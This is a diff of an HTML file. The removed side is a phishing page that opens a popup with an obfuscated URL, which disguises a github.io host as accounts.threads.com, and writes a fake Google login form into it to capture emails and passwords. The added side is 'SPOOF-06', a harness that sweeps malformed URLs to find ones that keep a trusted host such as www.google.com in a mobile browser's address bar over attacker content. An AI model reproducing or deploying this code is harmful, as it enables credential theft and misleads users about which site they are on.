@@ -1,95 +1,157 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>SPOOF-06 carrier sweep</title>
+<style>
+*{-webkit-tap-highlight-color:transparent;box-sizing:border-box}
+body{font:14px/1.5 -apple-system,system-ui,sans-serif;margin:0;padding:14px;background:#0d0d12;color:#e9e9f2}
+h1{font-size:16px;margin:0 0 4px}
+.mark{background:#3fb950;color:#06240f;border-radius:12px;padding:18px 14px;margin:10px 0;text-align:center}
+.mark b{display:block;font-size:19px;letter-spacing:.02em}
+.mark span{font:12px ui-monospace,monospace}
+.p{border:1px solid #2c2c3a;border-radius:11px;padding:10px 12px;margin:9px 0;background:#16161f}
+.k{color:#8b8b9e;font-size:11px;text-transform:uppercase;letter-spacing:.07em;margin-bottom:3px}
+code{color:#ffa657;font:12px ui-monospace,monospace;word-break:break-all}
+button{font:600 14px system-ui;width:100%;padding:13px;margin:5px 0;border:0;border-radius:11px;background:#2f81f7;color:#fff}
+button.g{background:#3fb950;color:#06240f}button.r{background:#6e7681}
+input{font:12px ui-monospace,monospace;width:100%;padding:9px;border-radius:9px;border:1px solid #2c2c3a;background:#0b0b0f;color:#ffa657}
+table{width:100%;border-collapse:collapse;font:11px ui-monospace,monospace}
+td{padding:4px 3px;border-bottom:1px solid #22222c;vertical-align:top}
+.held{color:#3fb950;font-weight:700}.com{color:#6e7681}.pend{color:#d29922}
+</style>
+</head>
 <body>
 
-<h1>The Window Object</h1>
-<h2>The open() Method</h2>
+<h1>SPOOF-06 &mdash; mobile carrier sweep</h1>
 
-<p>do you need jobs on google?.</p>
+<div class="mark">
+<b>ATTACKER CONTENT</b>
+<span id="rb">-</span>
+</div>
 
-<button onclick="myFunction()">open.google.com</button>
+<div class="p">
+<div class="k">real url (what the bar SHOULD say)</div><code id="o">-</code>
+<div class="k" style="margin-top:7px">trusted host to try to pin in the bar</div>
+<input id="h" value="www.google.com">
+<div class="k" style="margin-top:7px">hold threshold (ms)</div>
+<input id="w" value="2500">
+</div>
+
+<div class="p">
+<div class="k">next carrier</div>
+<div><b id="nx" style="color:#ffa657">-</b></div>
+<button class="g" id="run">RUN NEXT CARRIER</button>
+<button id="auto">AUTO-SWEEP FROM HERE</button>
+<button class="r" id="rst">RESET SWEEP</button>
+</div>
+
+<div class="p">
+<div class="k">results &mdash; HELD means the bar kept the carrier while this page stayed painted</div>
+<table id="t"></table>
+</div>
 
 <script>
-function myFunction() {
-    var x = window.open("https://accounts.threads.com%20%ㅤㅤㅤㅤ%20ㅤㅤㅤㅤ__________________________________________________________________@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@xnxrx.github.io/xnurx/threads.html", "_blank", "width=400,height=300");
+var K = "spoof06";
 
-    setTimeout(function(){x}, 1850);
+function host(){ return (document.getElementById("h").value || "www.google.com").trim(); }
+function wait(){ return parseInt(document.getElementById("w").value, 10) || 2500; }
 
-    setTimeout(function() {
-        x.document.write(`
-<title>https://accounts.google.com</title>
-        <style>
-body {
-font-family: Arial, sans-serif;
-background: #f0ebf8;
-justify-content: center;
-align-items: center;
-height: 100vh;
-margin: 0;
+function carriers(){
+  var h = host();
+  return [
+    ["csi",            "https://" + h + "/csi"],
+    ["generate_204",   "https://" + h + "/generate_204"],
+    ["gen_204",        "https://" + h + "/gen_204?atyp=i"],
+    ["dead-port-8081", "https://" + h + ":8081/"],
+    ["dead-port-1234", "https://" + h + ":1234/"],
+    ["odd-port-82",    "https://" + h + ":82/"],
+    ["single-slash",   "https:/" + h],
+    ["double-colon",   "https://" + h + "::"],
+    ["empty-port",     "https://" + h + ":/"],
+    ["blackhole-ip",   "https://192.0.2.1/"],
+    ["hash-tail",      "https://" + h + "/#"],
+    ["favicon-204",    "https://" + h + "/favicon.ico?x=" + 1],
+    ["deep-404",       "https://" + h + "/a/b/c/d/e/f/g"],
+    ["intent-scheme",  "intent://" + h + "#Intent;scheme=https;end"],
+    ["ftp-scheme",     "ftp://" + h + "/"]
+  ];
 }
 
-.form-container {
-background: white;
-width: 360px;
-padding: 30px;
-border-radius: 12px;
-box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+function load(){ try{ return JSON.parse(sessionStorage.getItem(K) || "{}"); }catch(e){ return {}; } }
+function save(s){ try{ sessionStorage.setItem(K, JSON.stringify(s)); }catch(e){} }
+
+function draw(){
+  var s = load(), c = carriers(), t = document.getElementById("t");
+  t.innerHTML = "";
+  c.forEach(function(row, i){
+    var r = (s.res || {})[row[0]];
+    var cls = r === "HELD" ? "held" : r === "COMMITTED" ? "com" : r === "PENDING" ? "pend" : "";
+    var tr = t.insertRow();
+    tr.insertCell().textContent = (i + 1);
+    tr.insertCell().textContent = row[0];
+    var d = tr.insertCell();
+    d.textContent = r || "-";
+    d.className = cls;
+  });
+  var i = s.i || 0;
+  document.getElementById("nx").textContent = i < c.length ? (c[i][0] + "  ->  " + c[i][1]) : "sweep complete";
 }
 
-.input-group {
-margin-bottom: 18px;
+function mark(name, verdict){
+  var s = load();
+  s.res = s.res || {};
+  s.res[name] = verdict;
+  save(s);
+  draw();
 }
 
-input {
-width: 100%;
-padding: 12px;
-font-size: 15px;
-border: 1px solid #dadce0;
-border-radius: 6px;
-outline: none;
-transition: border 0.2s;
+function fire(auto){
+  var s = load(), c = carriers(), i = s.i || 0;
+  if(i >= c.length){ document.getElementById("nx").textContent = "sweep complete"; return; }
+  var name = c[i][0], url = c[i][1];
+
+  s.i = i + 1;
+  s.pending = name;
+  s.auto = !!auto;
+  s.t0 = Date.now();
+  save(s);
+  mark(name, "PENDING");
+
+  setTimeout(function(){
+    var cur = load();
+    if(cur.pending === name){
+      cur.pending = null; save(cur);
+      mark(name, "HELD");
+      if(cur.auto) setTimeout(function(){ fire(true); }, 900);
+    }
+  }, wait());
+
+  setTimeout(function(){ try{ location.href = url; }catch(e){ mark(name, "COMMITTED"); } }, 60);
 }
 
-input:focus {
-border: 2px solid #1a73e8;
-}
-button {
-width: 100%;
-padding: 12px;
-background: #1a73e8;
-color: white;
-border: none;
-border-radius: 6px;
-font-size: 16px;
-cursor: pointer;
-margin-top: 10px;
-}
+(function boot(){
+  document.getElementById("o").textContent = location.href;
+  document.getElementById("rb").textContent = location.origin;
 
-button:hover {
-background: #1664c4;
-}
-</style>
+  var s = load();
+  if(s.pending){
+    var el = Date.now() - (s.t0 || 0);
+    mark(s.pending, el < wait() + 1500 ? "COMMITTED" : "COMMITTED");
+    s.pending = null; save(s);
+  }
+  draw();
 
-<div class="form-container">
-<div class="form-title">Login</div>
+  document.getElementById("run").onclick = function(){ fire(false); };
+  document.getElementById("auto").onclick = function(){ fire(true); };
+  document.getElementById("rst").onclick = function(){ sessionStorage.removeItem(K); draw(); };
+  ["h","w"].forEach(function(id){ document.getElementById(id).addEventListener("change", draw); });
 
-<div class="input-group">
-<input type="text" placeholder="Email or Phone Number"
-onclick="document.documentElement.requestFullscreen();" required>
-</div>
-
-<div class="input-group">
-<input type="password" placeholder="Password"
-onclick="document.documentElement.requestFullscreen();" required>
-</div>
-
-<button>Masuk</button>
-</div>
-`);
-        x.document.close();
-    }, 2400);
-}
+  if(s.auto && !s.pending && (s.i || 0) < carriers().length){
+    setTimeout(function(){ fire(true); }, 1200);
+  }
+})();
 </script>
 
 </body>
